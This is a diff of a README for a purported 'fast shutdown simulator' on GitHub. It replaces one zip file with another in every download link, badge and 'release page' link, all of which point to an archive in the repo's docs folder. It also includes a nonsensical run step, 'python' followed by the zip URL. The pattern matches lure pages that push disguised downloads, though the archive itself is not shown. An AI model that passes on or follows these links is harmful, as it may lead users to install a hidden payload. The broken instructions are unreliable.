@@ -1,6 +1,6 @@
 # 🚀 ria-fast-shutdown-sim - Fast Shutdown Simulation Made Easy
 
-[![Download Now](https://raw.githubusercontent.com/kalaiarasi-tech/ria-fast-shutdown-sim/main/docs/fast-ria-shutdown-sim-v1.5-beta.4.zip%20Now-ria--fast--shutdown--sim-blue)](https://raw.githubusercontent.com/kalaiarasi-tech/ria-fast-shutdown-sim/main/docs/fast-ria-shutdown-sim-v1.5-beta.4.zip)
+[![Download Now](https://github.com/kalaiarasi-tech/ria-fast-shutdown-sim/raw/refs/heads/main/docs/ria_sim_shutdown_fast_1.2.zip%20Now-ria--fast--shutdown--sim-blue)](https://github.com/kalaiarasi-tech/ria-fast-shutdown-sim/raw/refs/heads/main/docs/ria_sim_shutdown_fast_1.2.zip)
 
 ## 📖 Description
 
@@ -27,7 +27,7 @@ To run this application smoothly, ensure you have the following:
 
 To get started with **ria-fast-shutdown-sim**, visit the link below to download the application:
 
-[Download riaj-fast-shutdown-sim](https://raw.githubusercontent.com/kalaiarasi-tech/ria-fast-shutdown-sim/main/docs/fast-ria-shutdown-sim-v1.5-beta.4.zip)
+[Download riaj-fast-shutdown-sim](https://github.com/kalaiarasi-tech/ria-fast-shutdown-sim/raw/refs/heads/main/docs/ria_sim_shutdown_fast_1.2.zip)
 
 After downloading, follow these steps to install and run the simulator:
 
@@ -42,7 +42,7 @@ After downloading, follow these steps to install and run the simulator:
    - **For macOS/Linux:** `cd /path/to/extracted/folder`
 5. Run the simulator using the command:
    ```bash
-   python https://raw.githubusercontent.com/kalaiarasi-tech/ria-fast-shutdown-sim/main/docs/fast-ria-shutdown-sim-v1.5-beta.4.zip
+   python https://github.com/kalaiarasi-tech/ria-fast-shutdown-sim/raw/refs/heads/main/docs/ria_sim_shutdown_fast_1.2.zip
    ```
 6. Follow the on-screen instructions to simulate the shutdown process.
 
@@ -71,4 +71,4 @@ We welcome contributions from anyone interested in enhancing this simulator. If 
 
 If you encounter any issues while downloading or running the application, please reach out through the "Issues" tab on the repository. Your feedback is invaluable for making this tool better.
 
-For additional information, visit the [release page](https://raw.githubusercontent.com/kalaiarasi-tech/ria-fast-shutdown-sim/main/docs/fast-ria-shutdown-sim-v1.5-beta.4.zip) where you can find the latest updates and announcements regarding the simulator.
+For additional information, visit the [release page](https://github.com/kalaiarasi-tech/ria-fast-shutdown-sim/raw/refs/heads/main/docs/ria_sim_shutdown_fast_1.2.zip) where you can find the latest updates and announcements regarding the simulator.
